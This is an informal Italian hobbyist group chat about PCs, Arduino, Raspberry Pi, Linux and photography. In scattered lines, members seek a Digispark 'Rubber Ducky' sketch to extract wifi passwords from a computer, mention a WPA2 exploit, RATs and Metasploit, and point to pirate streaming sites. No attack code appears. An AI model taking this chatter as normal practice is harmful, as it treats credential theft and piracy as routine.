Mi conviene usare una distro Linux per C++ ?
+324 fps
Lo trovo un sacco fico
In che senso?
  sbaglio o hanno fatto prima i re magi del fornitore dell i9, che problemi di alimentazione ha avuto il pc?
Chi è l’artista?🤔
Ad esempio per il corso su Overnotes state usando Ubuntu per comodità
Con c++ cosa conviene usare ? Oppure è uguale ?
Ah beh ma quello perché s me piace Linux. Potevi fare tutto su Windows ovviamente
Se scarichi codeblocks su Windows per dire non cambia nulla
Posso aprire un applicazione .jar senza avere java? Non ne lo fa installare
Uuu 
 non era così male allora
Il casino
A ok
Marco il pittore 
Ahahahahahah
ma perche non create un epic logo over volt con high graphics? con photoshop si puo fare di meglio
Non immagini quante prove abbia fatto
Ahahhaha posso immaginare
Yesss
Dov'è il metallo liquido
Non é metallo liquido
Oh sì
É al diamante
Appena mi arriva il dissipatore porto la CPU a 4.3ghz
Ho ryzen e non supera 3.9 rip
Appunto, sto dicendo... Dov'è il metallo liquido?
In game no
Ma nel render
Eeeeeeh tanto non mi serve
Oh sì
Beh con la mia 970 mi da da bottleneck lo schermo
Dai non è così male la 970
Ho il 3 ripp
Per nulla
Io il 1600
Non ci arriva a 4.3
Sì
Un 240mm basta
Ma non per il calore
Anche i r7
Non superano i 4
Ah sì
Ho detto una cazzata xd
Mi stavo confondendo
Ryzen del pit
Cyka Blyat
Però
Consuma 65 watt 
I portatili Ryzen sono un meme
Ci hanno infilato un socket am4 intero
Poi la batteria dura poco più di 1 ora
3° durata peggiore in commercio
Mi sto pentendo di aver preso amd
Mah io mi trovo benissimo
Se voglio cambiare BIOS alla scheda video non posso
Se voglio overclockare il processore non sale di un cavolo
È un r3
Non diventa un i9 Extreme
Prova con gli asini
Eh
Però
Gli FX (lo so sono dei fottuti ciucciatori di corrente e scaldabagno industriali) li porti fin dove hai corrente e temperatura🤷‍♂
E sono dei chiodi
Si dicevo solo per il fatto del oc
Assolutamente si
Mah...ni
Usi un qualsiasi IDE
Beh il compilatore standard è fatto per linux.
Posso far credere al mio telefono di avere lo schermo sempre acceso, quando in realtà è spento 🤔 devo farlo credere ad un'app
Spoiler: fine del mondo
Qualcuno sa come si aprono i docx su Android senza la suite Office di Microsoft
Ci sono tante app
Io invio il doc ad un BOT telegram che lo converte in pdf
Se è solo per la lettura
Ok grazie
Si solo per lettura che app mi consigliate
Topdf_bot
È il bot
Ok lo aggiungo
Ho realizzato una cosa...  Verso il 19 gennaio 2028 lo standard a 32 bit per l' ora andrà in overflow....
RIP umanità??
Gli invii un qualsiasi file e lo converte in pdf
2028? O.o come fai a pensare così in là xD
Prima o poi bisognerà affrontare il problema
E visto che io sarò ancora vivo...probabilmente
Fra 10 anni sai cosa si utilizzerà? Ci sta che i 32 bit saranno abbandonati ed ci sarà una soluzione
Pensa ai sistemi più vecchi...
Magari ai vecchi impianti nucleari...  Oppure sui vecchi aerei..
In ogni caso ci saranno casini
Ho il presentimento di finire su ignuranza
si aggiornerà, come si è sempre fatto
Uhm... Non saprei.. Va bè.. Se qualche bomba atomica esploderà sapremo che qualcosa é andato storto
Io ogni tanto ci penso...  Se dovesse arrivare una tempesta solare cosa succederebbe...
Cos?
Imaggina... Tutti i sistemi elettronici in un attimo....  Puf
Pensa solo alle vittime istantanee...  Le persone sugli aerei... Le persone che vivono grazie a macchine...
Poi i danni collaterali
Immagina
Dovrebbe essere decisamente potente e a quel punto l'elettronica potrebbe non essere il più grande problema
Up
Non sono fatti così male eh. 
Hanno circuiti protetti e rindonsanti
Considerando il bellissimo effetto di schermatura del campo magnetico terrestre
Vivi male così xD
^
Però ora sono curioso sul cosa potrebbe succedere nel 2028 xD
Per cosa?
Piuttosto, pare probabile che nei prossimi anni ci sia l'inversione del campo magnetico terrestre
mettete uno spazio tra il 🤖 e il "!" vi prego
Rip sistemi di navigazione
Beh ma una tempesta solare forte passa
Mi state mettendo paura oh
tra poco vedi la gente su facebook che dice che la bussola bisogna cambiarla perchè dopo non segna più il nord
Cito tacher dal gioco rainbow six: più ti attacci alla tecnologia più ti fa male quando te la tolgono da sotto al culo
Dino tinelli 
(per prossimi si intendono su scale di tempi geologiche... Quindi anche qualche centinaio volendo)
Ovvio
ogni riferimento è puramente casuale ù-ù
XD
Arcobaiter triggered
Madonna che mongolo oh
Li stavo parlando seriamente e dopo un po' dice non parlo con i troll
Si auto trigghera
Sei a conoscenza dei sui sticker?
Purtroppo no
Risolvo subito
 questo, chi me lo spiega haha
Up
Grazie mille
Doppia m comunque
Ahahahahah
Ho sbagliato anche sarebbbe con fosse
Un errore dietro l'altro 
Noooo, ti prego no
Vediamo cosa dice

Non taggarlo
Perché? 
È il prof di italiano
Al massimo ti manda alcuni esercizi da fare a casa
Nemmeno dormire si può
L'italiano non dorme mai
Ma i suoi rappresentanti ogni tanto sì
Ma che cazz... è 00:08 non si può  dormire
Cambio della guardia?
Se ci si sveglia presto...
Tipo?
Tra 5 ore
O poco più
Idem
Solo che vado a dormire alle 2
Badboy
Ahahahahah
Per tutti quelli interessati alla costruzione di un potente drone racing (magari pure il nostro 
 visto l'ultimo video ahahaha) ho trovato questa offerta strepitosa
È il negozio ufficiale. Spediscono in italia a 4 euro! Quindi sta roba costa in tutto 20€ anziché 50€ e ha veramente tutto. Gli f4 (tutti) stanno a 15€ e tutti gli f3 a 10€!!!
ma ne avevamo già parlato hahahaaha
^

Salveeeee
Salve!!
Vedendo la tua foto profilo mi è venuto in mente che ho dei compagni di corso che come sfondo sul cel hanno una foto simile alla tua ma con la faccia di un prof al.posto di quella di thor xD
Ahahhaja
Ed ecco a voi come si dicerte lo studente universitario medio: meme e fotomontagi 
Salveeee!
Posso chiedere il rimborso per un ordine su girada?
Ho pagato ma non ho ancora trovato le persone, quindi volevo aspettare l'uscita di un nuovo telefono
Help
Isobara = pressione costante, quindi il lavoro è P*deltaV
Ossia W = p(Vfin-Vin)... Devi solo invertire
W sta per? Hahaha
Lavoro
Work in inglese
Dipende quanto tempo è passato
3 mesi
Se ti compare il bottone fai, sennò aspetta qualche anno
Che Bottone?
Differenze tra la yi lite e la yi Discovery?
ciao
E poi lui sbagliò le unità di misura
Lol
Ok...  Musk é pazzo
L'hanno mancato poi
^
Lol...  C'era da aspettarselo
^
Marco devi aggiungere 
 ai canali dai quali si può inoltrare
Come fai a mettere la velocità di Internet sulla barra
É di default nel mio telefono...  Meizu m5
Ah peccato..
Anche sul mio è di default
Ci saranno delle app
Qualcuno conosce i comandi at per i dispositivi gsm?
Li trovi online, google aiuta
Lo so ma non trovo come far leggere i mess che gli mando con iphone ho cercato duemila cose ma nnt
Perche gli iphone usanto il testo unicode e gli android gsm alfabeto
... Android usa utf8 esattamente come iphone
perchè android è pelli acer11!
É arrivata  D3200 con obbiettivo 18-105
Qualcuno ha ricevuto già il Rasp Pi3 di cui c'erano solo 40 pezzi mi sembra (l'offerta è di qualche settimana fa) ?
Preso da GearBest
Si

 ‎€2‎2.‎38‎ i‎nv‎ec‎e ‎ch‎e ‎€4‎8.‎50
⚖️‎ R‎is‎pa‎rm‎i ‎il‎ 5‎3.‎86%
⭐️‎ 4‎.9‎2 ‌‎/‌‎ ‎5.‎00‎ (‎10‎51‎ r‎ec‎en‎si‎on‎i)
✂ 
: 


Coupon attivo alle 13:30, intanto toglietelo e rimettetelo nel carrello (per sicurezza se lo avete da ieri), refreshate la pagina e preparate il cupon copiaincollato nella casella dei coupon 

 

Questa era l'offerta...
ma la vera domanda è: come diavolo fai a stare in quell'angolino tutto compresso?
in verità sto abbastanza largo
Qualcuno ha esperienza nel modding dei tablet Amazon?
Vorrei togliere tutta quella merda
Raga vi segnalo questa bella offerta: 
 sarebbe bello se nella serie di hacking facessi anche qualche collaborazione con Aftutorial
(Scritto a mano)
Unsopported characters
Ah, il bot non si triggera se lo scrivo normalmente
In che senso normalmente?
Se scrivo lettera per lettera "Unsopported characters"
ah lel 
credo che riconosca il carattere, non la scritta
quella apparirà solo per i clients
Il mio softbox diy prende forma  
Uuuh
Ti mando la foto come finisco
🤔niente male..io con la stessa idea ci ho costruito un set per verniciare a bomboletta e non macchiare in giro
ragazzi provate ad andare nelle impostazioni di telegram desktop e a digitare "workmode"
ho fatto, ho premuto ok...e poi?
adesso hai il tasto sopra le chat "Nascondi chat silenziate"
figo
è vero
a caso 
wow
Fa una bella luce
Devi vedere la mia luce a led xD
Il supporto dei led è una chicca
Bella

perchè il mio display viene visto su questo canale i2c?
in un programma py è scomodo perchè mi dice name not definied
a cosa equivale fx30 in intero?
tolto tolto
anche se mandi il carattete, adesso l'abbiamo tolto
Ci proverò 
qualcuno di voi ha mai usato i servo con rpi?
Ma se io sto avendo problemi pure  a connettermi via ssh al pi
Non mi pinga più il rasp
Mi dice:  "temporary failure in name resolution"
shish
l'ip è giusto?
Che? Io dico dal rasp
L'obbiettivo è arrivare a collegarlo via ssh
appunto
ti sei connesso con il giusto ip?
hai attivato l'ssh?
Buonasera, scusate il disturbo mi servirebbe un aiuto. Ho appena installato (in dual boot) ununtu gnome, ma il touchpad non mi funziona perfettamente, in particolare funziona lo scroll ma non funziona il click con il touch. Il click fisico invece lo legge...non so se mi sono spiegato bene...

Sapete se e come posso risolvere?
 vai Cicca! Scelgo te! usa attacco driver! 

ma vi pare una cosa normale?
che non posso giocare online ai giochi di Microsoft (quindi pure il nuovo Minecraft) perché sono minorenne?

che poi quel sito è fatto malissimo
clicco una cosa e mi apre 200 pagine che non voglio tranne quella che voglio
cancello il mio account Microsoft vaffanculo (e ora ho triggerato male il bot) e resto col vecchio Minecraft
basta modificare che spamma ogni volta che modifichi il messaggio 
ah ._.
intelligente la mano...
Ciao
e 3 
Si
Son riuscito a risolvere grazie mille:)
Ai tempi dovetti rifarmi l'account per giocare su xbox.
Ma perché non usi il classico minecraft scaricabile dal sito
?
Come faccio ad inviare un segnale ir con il modulo di Arduino?
Mi serve clonare un telecomando
Esiste un gruppo di video editing??
Prova nel gruppo di Tom's Hardware di Marco 
??
Come si chiama quel programma per win7 che metteva tutti i driver?
Windows Update?
Era un software a parte
Allora non so
Prova con driver booster
Vi spiego, è che praticamente ho reinstallato Windows 7 sul portatile e il fisso è rotto, solo che mi sono dimenticato i driver, quindi non posso connettermi ad internet
E cercavo in software da scaricare da un altro PC per mettere tutti i driver mancanti
che libreria hai usato allora?
Digikeyboard
ok
cambia solo il nome?
o anche i comandi
Comunque non sono riuscito a far funzionare nessuno Sketch da Rubber ducky perché tutti pieni di errori
A cosa ti riferisci?
ah, rip
se cambiano anche i comandi
Rispetto a?
Comunque se qualcuno di voi volesse spiegarmi un po' di cose su Rubber ducky in privato glie ne sarei grato
È inutile sapere e non condividere con gli altri
Ho scoperto come fare un impianto di messa a terra molto pratico e veloce


pianti un picchetto nell'orto, fatto
o anche così ù-ù
e niente, io sono tornato dal tandem....ho scoperto che l'nxp che usiamo ha un'uscita analogica, la voglio usare assolutamente :P
Ma funziona?
Piccola
Che domande
Ovvio


(che no, dove cavolo disperde, spiegami)
Sei un genio
 consigli per girare sulla neve?  Sia reflex che GoPro
Help pls

Come faccio l'eseguibile di un programma python?
Puoi usare pyInstaller, py2exe o cx_Freeze
C’è la libreria py2exe
Ah non sapevo ci volesse una libreria... ok grazie cerco un po' su google
Raga che significa quell' errore ?
Penso sia un errore della libreria e non di sintassi, ergo non ti posso aiutare perchè non l'ho mai utilizzata
Confermo... Ma adesso perché non compila?
?
Mi sa che tra poco lo gettò nella spazzatura
Nessuno mi può dire perché non va?
Google?
Serve tutto il codice
E abilita i warning del compilatore dal menu dell'ide
Ok
ma mandare il codice con 
 che almeno è più leggibile?
L'errore è nella linea 71, come dice il compilatore, ma hai messo tutto tranne che la linea 71.....
È finito il codice non c è nulla
Postalo su pastebin

Non esiste la riga 71?
No
Prova a metterci qualcosa nel loop
Tipo anche solo un delay(1);
Ma il codice?
Momento
Guarda "Beppe Ferrara - un sorriso per la pace 
" su YouTube

L errore è questo
Ok loc 20
Loc 22
Quella F?
?
25
28
31
34
Tutte lo stesso errore
Provo a toglierle
Non puoi scrivere


Devi scrivere

Capisco correggo subito
Dai escono solo errori però l14
Se vuoi scrivere il carattere
\
Devi digitarlo due volte
\\
Quindi
"c:\qualcosa" è sbagliato
"c:\\qualcosa" è corretto
Grazie per l aiuto, però il codice è pieno di altri errori... Tu non avresti un codice già pronto da caricare?
Non so manco cosa stai facendo
Rubber ducky digispark
Ne so quanto prima


Praticamente uno sketch che si basa sull'utilizzo di un piccolo controllore Arduino based per estrarre password wifi ecc.. da un pc
Ovviamente faccio questo a scopo didattico e non malevolo 
LOL
Mi è arrivato oggi.. Tanta tanta voglia di imparare ma poca poca esperienza
Ehhh idem
Fammi sapere se riesci a caricare uno sketch utile
Un hello world vale?
No
Ci sono riuscito con quello ahahah
Hahahahah
Questo video... gia visto che mostra  la luna visibile sia in Italia che in  Australia... tramite 2 persone collegate su facebook appunto una in It e l'altra i n Au.....  ora non e' piu visibile in italia..... Molto strano,....perche????
Lol
Questo BOT é fantastico
Non lo conosco.. Cos'è?
Cita arcobaiter
quel video... sono stufo di vederlo qui... oltre a parlare e' un maleducato...  Ma vi rendete conto  che la terra sferica poggia su teorie del 310 ac?? E anche il niente popo' di meno di Pitagora era scettico....
overflow di cromosomi
Mai quanto questo
Fermi
Piglia per il culo i terrapiattisti?
Hahaha
No..  Arcobaiter é il complottista per Eccellenza
Mh, non conosco hahahaha
Mi fa morire
MMMMMMMMMmmmmmmmm sono sicurissimo che funzioni 
Aiutoo
Non riesco a installare libnl-3-dev su kali
Cioè non mi trova il pacchetto
Ma è per la Rubber ducky?
Si
Ho la soluzione
Dopo ore ho risolto
Hai tolto Kali?
Nono
Ho scoperto che era già installato
Voglio provare questo nuovo exploit per le wpa2
Domani me lo studio un pó
Si ma non va
Nel senso che ci sono una marea di errori
Ah bene 
Se mi fosse arrivato la board proverei a sistemarlo
Ma hai cercato altri traduttori?
Buongiorno! :)
Ho il pc in dual boot, se non premo ESC per entrare nel bios parte Windows. Qualcuno sa come posso far partire prima Linux?
Stai usando grub?
Ne ho provati 3
Cosa sarebbe?
Quel coso che compare e ti fa scegliere windows o  Linux
Sisi scusate non è che son tanto esperto di linux..anzi per niente
Si appare questo dopo che entro nel bios e vado a scegliere il bootloader o qualcosa del genere..f9 ora non ricordo il termine..comunque appare questo
Ok perfetto, allora belle impostazioni del bios devi cambiare il boot order... Al primo posto dovrebbe esserci Windows Boot Manager (che fa avviare Windows in automatico) e dopo un po' dovrebbe esserci grub. Devi spostarlo per primo
Ho questo..
Usb mi pare lo avessi messo io tempo fa quando ho formattato win10, grub non c'è
Os boot manager?
Boh suppongo sia quello di  Windows...è sempre stato li
Non puoi tipo provare a vedere se si apre qualcosa con invio o cose così?
No niente..gia provato..son gia dentro un sottomenu
Il menu piu esterno era questo
Mmm ma che distro è?
Di Linux? Ubuntu GNOME 16
Volevo giusto provarla mi piaceva la grafica
Ma grub riesci ad aprirlo?
Si, appena lo accendo premo ESC e mi appare una lista di 7-8 cose che posso fare, tra cui Setup del BIOS, e varie cose tra cui scegliere un altro OS o qualcosa del genere (ora nn posso fare la foto non sono a casa), entro in quest'ultima e mi fa scegliere tra windows e ubuntu
Tutti e tre "traducono" male?
Ed entro da li, se mi dimentico di entrare nel bios avvia windows normalmente
Mmmm strano che non ci sia anche lì... Prova a cercare su google tipo  "grub BIOS 
"
me li elenchi?
Se puo aiutare è un HP Pavillion..
Ne esistono tipo 60 milioni però è utile ahahah
 scusa non ricordo il modello ora..tra 60 min se serve posso dare tutti i dettagli..
No tra ahahah
Appena torno a casa te li dico
ok, grazie
che router xiaomi mi consigliate? me ne serve uno che abbia un'ottima copertura
 
Quello che ha comprato marco, gli piace
qual è?
che ne pensate del mi router 3
?
L'apostrofo
si lo so ho sbagliato
Raga ma secondo voi si può instalare Metasploit su Raspberry?
Sì
Ne sono certo al 100%
o sto facendo in questo momento
🤣🤣🤣
Ciao
Dove?
Mi hanno consigliato questo gruppo
Avrei una domanda...
Prego
Premi i tasti
Come formatto dal bios
?
Non ho os
PC assemblato
Ma mi dice che NHo due partizioni
Cosa vuoi formattare?
1 da 927 piena
E una da 4
Beh crea una chiavetta abbinabile con un partiton manager e formatta
Ok
Grazie mille
 ma il video sulle strisce led della postazione?
ah e 
 per quanto riguarda l'asse z che fluttua random, hai messo una resistenza pull-up per stabilizzarlo? Prova a mettere una reistenza abbastanza grande (qualcosa come 4,7k o 10k può andare) tra 5V e il pin digitale.
Oppure puoi provare con quello interno nell'Arduino, nel setup fai un digitalWrite 1 sul pin dopo averlo dichiarato come input, oppure nel pinmode metti INPUT_PULLUP.
esistono hosting di vps windows con 4gb di ram sotto i 10€?
Prova 
Oppure ovh
costano un casino
12,99€

Linux/Windows
1 Core
Intel® Xeon® E5-2650L v4 Intel Xeon
2 GB
RAM
40 GB
SSD Storage
5TB/mese
data transfer
Io ne ho una ad un euro al mese...
windows?
Linux 1gb
Per hosting web
ah
Prova 
utilizzo la prova di aruba vah
Ovh 4gb li da a 5 euro
Ma cosa devi fare?
mi serve un vps windows per fare da cloud
Linux non te gusta?
Cloud a cosa?
tipo scarico i file in alta velocità da utorrent e me li passo sul pc, vorrei provare dei rat, usare port scanner e ip scanner
Con Windows??
linux sò usarlo ma non ho voglia di smanettarci su
🤦‍♂
kyao

Ragaaa mbr o gpt?
che ne pensate?
Prendi da ovh
Inception
ti osservo
Anche io
HAHAHAHAHA
COSA STA SUCCEDENDO
per fortuna che dovevamo tenere i due gruppi separati
NEL DUBBIO 
 TUTTI
 
 consigli per video sulla neve?  Sia reflex che GoPro
 al prossimo screen che fai vieni bannato 
Lol
Iutubee bacgrundddd
Wut
basta mettere newpipe
commento e descrizione li ho levati io dal app, ma sono visibili
 guardate e tremate 
gente come faccio ad attaccare l'arduino al pc senza che esegua il suo codice?
Sei lezzo
non puoi
Ehm ok
bella, allora lo posso buttare
perchè?
Lol allora si é buggato tutto
Metti un interruttore
ho un codice che manda in output con keyboard.h una scritta continuamente nel loop(), non faccio tempo a caricargli il nuovo script che lui inizia a scrivere a botta tutto
Rip
seriamente?
che cagata però...
Prova a disabilitare l' input tastiera... Ci sarà il modo
In Windows
si può?
Credo di si
Ho paura a sapere cosa scrive...
Anche io
Raga io dovrei iniziare una tesina su arduino, sapete percaso dove trovare materiale utile?
val : valore_analogico
nulla di che, mica faccio lamerate io ù-ù
Grazie bot di aver avvisato del video 
❤️
Anche quello non funziona come i feed
Quale video???? 
E' tutto collegato
Complotto
Te l'avevo detto 
 che dovevo fartelo io 
Eh, quello di cicca non si unirà al complotto
GPT e UEFI
Eh bea roba... Lo registro oggi penso 🤔
uh nice
E non puoi fargli mandare quelle cose in output e poi caricare sketch
tra l'altro domani verrò verso le vostre parti
è nel loop()
comunque ci sono riuscito
non ci sto capendo nulla
che poi il KEY_RETURN non funziona ._.
ehm, ma lo hai messo nel loop
yep
ora comunque ho risolto
ho usato un locker per tastiere e compilato con il tastone sull'ide, ho messo un delay iniziale di 10 secondi giusto per poter ricompilare se serve
cmq se io devo scrivere in uscita il valore analogico in entrata su un pin, usando keyboard.print(); come faccio? dovrei convertire l'int in una stringa, come posso fare?
asp, provo con (String)variabile; anche se non credo vada visto che l'altro giorno non andava con l'nxp
In cpp la conversione da stringa a intero e viceversa si fa con "atoi" e "itoa" (è una funzione, come parametri bisogna passare la stringa e la variabile di tipo intero)
taglia il cavo TX
Grazie mille
te ne sto mandando altri, ma l'adsl mia fa pena
Ahaha ok grazie
un pochino di pazienza
non ne voglio parlare
HAHAHAHHAAHA la rubberducky colpisce
arduino schifo
praticamente stavo completamente ignorando di avere ancora l'arduino in lavorazione e ho aperto telegram giusto per
tranqui ti ho sbloccato io prima
ma a che ore esce il blog di OV?
Ragazzi ora sono su kali
Per installare windows in dualboot come faccio?
Mi hanno detto che è un casino e che faccio prima a formattare l'hard disk e installare direttamente windows
thx
01/03/2018, ora indefinita (maybe mezzanotte)
ok grazie
secondo voi è meglio anet a8 o prusa i3?
La prusa i3 mk3
la anet a8 è una prusa i3...
un clone toh, non ci cambia nulla, pur sempre una prusa è
Nono la original prusa i3 mk3 è meglio vai tranquillo
dici? ok
questa dovrebbe andare bene giusto?
Bah
Weilà ragazzi! Sto seguendo il video "DOMOTICA: LA GUIDA COMPLETA E DEFINITIVA" Ma ho un problema col sonoff. Non appare la rete WiFi. Qualcuno ha avuto sto problema?
Si a volte lo fa
ragazzi se vi interessa questo è il gruppo/canale dove inseriamo i libri e i pdf (anche libri universitari) 
 attualmente sto caricando Arduino e libri universitari di Elettrotecnica (tra cui il Perfetti)
 aggiungiti anche tu perchè non mi fa inserire il tuo usn, a causa del blocco privacy..Cicca e Filippo già ci sono
Un consiglio al volo dovrei usare il rapberry per ascoltare musica ok ma il problema e' quale sheald compro per avere uscite rca o jack o se possibile ancora meglio collegare le casse dirette
Bel gioco 
:v
wait
abbiamo dei server in comune?
United Community
ah il mio
lol
se fosse per me io farei un piccolo circuito sfruttando il pwm per fare un'uscita analogica e userei quella, se vuoi sentire semplicemente la musica l'entrata 3.5mm del pi 3 sarebbe giusta, te che rasp hai?
🤔che io sappia il raspberry ha l'uscita jack..non ti basta un semplice adattatore jack-rca?
oppure vuoi proprio un DAC?
sei pazzo?
why?
fa cagare, è un pwm con un condensatore lol
l'importante è che funzioni ù-ù
perché ci sarà un motivo se esistono DAC da 2€ e dac da 800€
Naaa ha solo inalato troppo stagno
^
queste sono bestemmie
no, peggio, sono tirchio
perché ho 5000€ di impianto audio se con 1€ posso farmi uno speakerino funzionante?
quanto vuoi spendere? le schede audio per il raspy vanno da 18 a 50€ circa (su Amazon, poi su Gearbest/Banggood onestamente non ho guardato)
per lo stesso motivo per cui io sfrutterò l'nxp che mi hanno dato all'università per farmi un oscilloscopio
anzi...per il motivo opposto, io sono povero
Poi ci sono io: * compra una reflex * * fa i softbox diy *
*coerenza*
tipo io con una razer blackwidow chroma 2016 da 250 euro e affianco sto usando la scheda di una vecchia cassa bluetooth dei cinesi come amplificatore
tentando di fare un piccolo caricatore con i pannelletti solari delle calcolatrici
Per l uso che ne faccio va bene una 30€ ma poi posso collegare le casse dirette o ho sempre bisogno di un ampli.
Io lo userei per musica da camera percio non a 1000w
ecco cosa succede aprendo un server di Minecraft che non apri da due anni
poor java
javamerda*
sattoh ù-ù
però wait è partito
e tentandoci ho distrutto uno di quei pannelletti..dite che posso riattaccare i pezzetti e farlo tornare a funzionare magicosamente?
 che usa blender come editor
queste non sembrano male, sopratutto la prima: 1)
  2)
Eeee abbiamo fucken corrente saltataaa
Grazie
figurati una ha anche doppia uscita
E meno male ho il 3g
Eh qualcosa di più generico..  Che in Italia non esiste
ma se sei admin come fai a non poterlo aggiungere 🤔
HAHAHAAHAHAHHAHAAH
Raga chi se ne intende di fotografia?
Need discord link

mi dice che non lo posso aggiungere a causa delle sue impostazioni della privacy
Cicca
 posso farti una domanda?  Cosa mi consigli di fare per girare sulla neve?  Sia con reflex che con GoPro??
ma sul canale o sul gruppo admin?
Mi limito a riprovare
ho scassato il pc alla prof
ora lo porta in assistenza
dove trovo i driver dell'asus transformer t100h?
ah capito: il gruppo l'ha creato Gioele, e non ti ha messo admin
ho formattato il pc con win 10 home x64, scaricato i driver, installati e non andavano
Wait
Qualcuno ha esperienza di condensatori elettrolitici in parallelo ??
gruppo admin
sul sito di Asus
non funzionano
hai provato con quelli generici di windows? di solito li installa da Update
non funziona nemmeno internet
 qui hai qualche problema di privacy, non mi lasciano aggiungerti, ti scrivo in privata con il link del gruppo?
strano..ma hai fatto installazione ex-novo del sistema operativo?
io non uso più il raspi per l'impianto audio
ci ho piazzato un PC che mi da molti meno problemi, specialmente con Spotify che su Windows funziona (molto) meglio
Ragazzi mi potete aiutare
raccolta di PDF illegali?
no, non tutti  molti li hanno dati i prof alla mia fidanzata
vado a reportare su 
 non si viola la copyright
é illegale
guarda che sono tutti free eh
indaghero
In pratica Ho scaricato 3 sistemi operativi: windows e due distro linux. Fino a quando avevo windows e una distro linux tutto a posto... Quando ho installato l altra distro, non so se ho toccato qualcosa nel bootloader, quando avvio il pc non trovo più l opzione di avvio windows
Io ho fatto cosi
Ma il famoso sito in cui si parlava nel manuale domotica completa e poi online ?
ma fai come vuoi..mamma mia che fissazioni..sarei curioso di vedere se tutti i tuoi programmi sono con licenza 🤔
chiedi a 
, è lui il mago di linux
madonna, spero che l'assistenza riesca a mettere i driver e windows
Niente da fare, dopo questo messaggio è già scappato in Canada
Che dite di un thinkpad yoga a 180/200 euro?
ma figurati, trollino del sabato sicuramente
È buono come prezzo?
Conosco il proprietario del voip, è gente simpatica
che modello?
ce ne sono tanti di Yoga
cioè?
Uno con 8gb ram i5-4100u e 500gb hdd
20CD-S03600
A 200€!?!?!?
Questo dovrebbe essere il modelo
Un asta
Ah
Siamo sui 170+25
ebay? mandami il link oppure il modello completo che controllo
Se non devi fare cose estreme è ottimo
Uno yoga lo usa la mia prof di fisica e sembra andare bene
gio...non siamo più nel 2010 ._.
>>>>appare giulian selvatico
yeeep, mi è tornato il wifi
non salire oltre 230-250...quello con ssd viene 280 
mi raccomando pure la postale avvisa che se altrimenti qua la fanno franca
Giu non gli dare certi suggerimenti
Hahahahah
al massimo va e trova direttamente te

Hai usato il tornio nel periodo di assenza?
se ti interessasse sto tentando di trovare la massa dalla variazione di energia potenziale di una caduta libera, comunque no, non l'ho usato e manco ci sto riuscendo a fare sto esercizio
Perché mi suona da fisica per martedì?
perchè è così forse? comunque mi esce giusto...solo scostato di un decimale...
no ok...credo sia la risposta del libro quella sbagliata, vabb
lascialo stare, è un voip di uno di iGNUranza 
Ma è semplice + semplice
per quello credo che sia il libro a sbagliare il risultato
Grazie mille
basta fare mgh=U contando che quando arriva a terra è pari a 0, quindi m*9.81*46=25000 che esce 55,4 N, nel libro mi dice 5,4 * 10^2 N...ditemi se sbaglio
Massi vai sempre
Coooooooomunque, chi sa usare bene la libreria IRremote?

E sicura questa app 
È open, e smettila di taggare Marco inutilmente
Ah, dimenticavo.......la "e" con l'accento
Manda il testo
Ok grazie
Domanda, Mr robot 3 in italiano c'è o solo sub ita per adesso?
Solo il primo episodio è in Italiano completamente che io sappia
si figurati se mi preoccupo 
Ah ecco
Su cb01 c'è solo quello
Io avevo trovato anche la seconda stagione, ma non ricordo dove
Guarda su serietvu .online
L'emettitore manda il segnale una sola volta, poi non risponde più finche non resetto la scheda.. Però fa così solo se metto irrecv.resume();

Se non lo metto manda lo stesso codice a profusione e mi accende/spegne la tv
I dati ce li hai...bisogna trovare la massa in newton
La massa in newton?!?
 che esercizio è?
Il...26 o 27 mi sembra, di quella pagina in cui sta anche il 31, quello che dicevi non fosse giusto perchè no...sulla caduta libera e dissipazione dell'energis sott'acqua comunque ora sono fuori casa
Massa in newton nel senso che è scritto così ma credo intenda la forza peso
Txxx o Xxxx
Stai sul canale dei libri?
ragazzi
ma se dovessi cambiare il contenuto di una pagina in un modo dinamico ( quindi senza passare ad una nuova pagina html ). come potrei fare?
ho provato a buttare i due contenuti ( vecchio e nuovo ) dentro un div con id e poi tramite un bottone andasse a triggerare uno script in jquery che nasconde il contenuto vecchio mostrando quello nuovo. non va.
teoricamente potrebbe funzionare con append e propend però non mi piace come soluzione
20CD-S03600
?
A cosa ti serve/che caratteristiche vuoi?
Vabbè, ti serve la rivista su Linux?
Devo compilare i progetti fpga di labview e mi serve un po' di potenza di calcolo in modo da non metterci secoli
È il touch è bello
Ah se proprio il touch ok
Altrimenti se puoi sopportare un po di peso in più (almeno credo) vai di T430 o X230
Reflex sta' attento
Ho paura di sovraesporre tutto...
Più che altro con il riflesso sulla neve
Io ho preso il T430 a 145€ spedizione compresa, con i5-3210M 500Gb hdd 4gb ram (da aumentare ma con ~40€ ne prendi 8Gb) e schermo in 1300 (anche se doveva essere in 1600)
Scatti in raw ovviamente... E poi sistemi con lightroom
No lo "sta' attento" è per non rovinare la macchina
E il sensore
Ovvio
E sulla GoPro?
In teoria può scattare in raw anche lei
Eh però vorrei filmare...  Ed ho solo 16 gb
Mio consiglio è di scattare in manuale con la reflex, tutto il bianco può mandare in palla l'esposimetro
Ok..  Abbasso ISO e tempo di esposizione?
Iso tienilo a 100, tanto... Poi bilanci di apertura e tempo di esposizione
Ok
Spero di non fare casini...  Sto ancora imparando
Salve ragazzi vedevo il video della rubber ducky, ma dice che non trova la libreria...sapete come fare?
Hai scritto quella riga all'inizio?
Questo e il codice
È*
Vai nella cartella che ti indica
Quella Documents\Arduino\libraries
Ok poi?
Ne hai due di librerie... Prova a cancellare una (ovviamente facendo la copia da qualche altra parte)
Non va le altre le ho spostate sul desktop
Togli anche keyboard master
E rimetti le altre che non si chiamano keyboard
Mehnz acquistato per 198 euro
Ecco l'errore che mi da se non ce keyboard
 ^
Ok prova allora a rimettere keyboard master in documents e a spostare quella un Program Files/Arduino/Libraries
Avevo offerto per il T430 ... Solo che prima è arrivato a 160 euro...
È domani finiva l'asta
Con questo venditore a cui ho comprato ci ho giá avuto a che fare quindi so che è serio
Io ci ho messo quasi tre settimane per prenderlo
A me è venuta la  l'altro giorno quando ho visto quello con i5-6100u a 130... Che mi sono fatto scappare
Cmq mi pare un ottimo prezzo per essere touch e lo posso anche girare a 360°
Sì se ti interessa il touch non è male
Ma la versione U è meno performante della M di solito
Eh vabbe
Sempre meglio dell'i3-310m che ho adesso hahahha
Ahahhahaha
Anzi qualcuno qui dentro (anche se dubito) ha provato me_cleaner e/o coreboot?
Perfetto
maronn... massa*9.805
Vabb ovvio
Cof cof sessodrogaepastorizia cof cof
Posso attaccare lo schermo di un vecchio Tablet sul raspberry? (come riciclare un Kindle Fire prima generazione)
Prima di smontarlo, dato che mia mamma lo usa per Candy crush 
Noon credo
La porta è diversa
Ci sarà un adattatore o qualcosa di simile? 🤔
❤️
